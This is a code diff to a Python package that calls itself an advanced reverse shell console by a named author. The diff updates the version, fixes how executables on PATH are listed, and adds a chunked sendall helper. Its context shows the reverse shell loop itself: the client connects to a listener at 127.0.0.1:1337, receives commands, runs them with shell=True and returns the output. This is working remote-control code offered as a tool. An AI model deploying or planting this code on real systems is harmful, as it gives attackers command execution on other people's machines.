@@ -24,7 +24,7 @@ This package implements an advanced reverse shell
 console (supports: TCP, UDP, IRC, HTTP and DNS).
 """
 
-__version__ = "0.0.1"
+__version__ = "0.0.3"
 __author__ = "Maurice Lambert"
 __author_email__ = "mauricelambert434@gmail.com"
 __maintainer__ = "Maurice Lambert"
@@ -63,9 +63,18 @@ def get_executables():
     return [
         file
         for directory in environ["PATH"].split(":" if name != "nt" else ";")
-        for file in listdir(directory)
         if exists(directory)
+        for file in listdir(directory)
     ]
+
+
+def sendall(data):
+    chunk = data[:30000]
+    data = data[30000:]
+    while chunk:
+        s.sendall(chunk)
+        chunk = data[:30000]
+        data = data[30000:]
 
 
 while True:
@@ -86,7 +95,7 @@ while True:
                     }
                 ).encode()
             )
-            s.send(data)
+            sendall(data)
             recevied = s.recv(65535)
             s.close()
 
@@ -94,7 +103,7 @@ while True:
         while True:
             s = socket()
             s.connect(("127.0.0.1", 1337))
-            s.send(data)
+            sendall(data)
             command = s.recv(65535).decode()
             p = run(command, shell=True, stdout=PIPE, stderr=PIPE)
             data = p.stdout or p.stderr or b" "
